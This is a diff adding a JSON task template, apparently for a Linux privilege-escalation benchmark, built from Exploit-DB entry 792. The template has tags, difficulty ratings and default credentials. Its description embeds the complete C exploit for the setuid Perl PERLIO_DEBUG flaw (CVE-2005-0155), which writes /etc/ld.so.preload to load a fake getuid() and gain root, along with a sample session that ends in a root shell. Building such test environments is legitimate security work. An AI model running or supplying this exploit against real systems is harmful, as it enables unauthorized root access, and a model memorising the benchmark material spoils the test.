@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_792",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Setuid perl - 'PerlIO_Debug()' Root Owned File Creation Privilege Escalation (OSVDB-13451;CVE-2005-0155)\n\nExploit source code (792.c):\n```\n/*\n * Copyright Kevin Finisterre\n *\n * ** DISCLAIMER ** I am in no way responsible for your stupidity.\n * ** DISCLAIMER ** I am in no way liable for any damages caused by compilation and or execution of this code.\n *\n * ** WARNING ** DO NOT RUN THIS UNLESS YOU KNOW WHAT YOU ARE DOING ***\n * ** WARNING ** overwriting /etc/ld.so.preload can severly fuck up your box (or someone elses).\n * ** WARNING ** have a boot disk ready incase some thing goes wrong.\n *\n * Setuid Perl exploit by KF - kf_lists[at]secnetops[dot]com - 1/30/05\n *\n * this exploits a vulnerability in the PERLIO_DEBUG functionality\n * tested against sperl5.8.4 on Debian\n *\n * kfinisterre@jdam:~$ cc -o ex_perl ex_perl.c\n * kfinisterre@jdam:~$ ls -al /etc/ld.so.preload\n * ls: /etc/ld.so.preload: No such file or directory\n * kfinisterre@jdam:~$ ./ex_perl\n * sperl needs fd script\n * You should not call sperl directly; do you need to change a #! line\n * from sperl to perl?\n * kfinisterre@jdam:~$ su -\n * jdam:~# id\n * uid=0(root) gid=0(root) groups=0(root)\n * jdam:~# rm /etc/ld.so.preload\n *\n */\n\n\n#define PRELOAD \"/etc/ld.so.preload\"\n#include <stdio.h>\n#include <strings.h>\n\nint main(int *argc, char **argv)\n{\n\n        FILE *getuid;\n        if(!(getuid = fopen(\"/tmp/getuid.c\",\"w+\"))) {\n                printf(\"error opening file\\n\");\n                exit(1);\n        }\n\n\tfprintf(getuid, \"int getuid(){return 0;}\\n\" );\n        fclose(getuid);\n\n        system(\"cc -fPIC -Wall -g -O2 -shared -o /tmp/getuid.so /tmp/getuid.c -lc\");\n\n\tputenv(\"PERLIO_DEBUG=\"PRELOAD);\n        umask(001); // I'm rw-rw-rw james bitch!\n        system(\"/usr/bin/sperl5.8.4\");\n        FILE *ld_so_preload;\n\n        char preload[] = {\n                \"/tmp/getuid.so\\n\"\n        };\n\n        if(!(ld_so_preload = fopen(PRELOAD,\"w+\"))) {\n                printf(\"error opening file\\n\");\n                exit(1);\n        }\n        fwrite(preload,sizeof(preload)-1,1,ld_so_preload);\n        fclose(ld_so_preload);\n}\n\n// milw0rm.com [2005-02-07]\n```",
+  "cve": "OSVDB-13451;CVE-2005-0155",
+  "exploitdb_id": "792",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_792",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
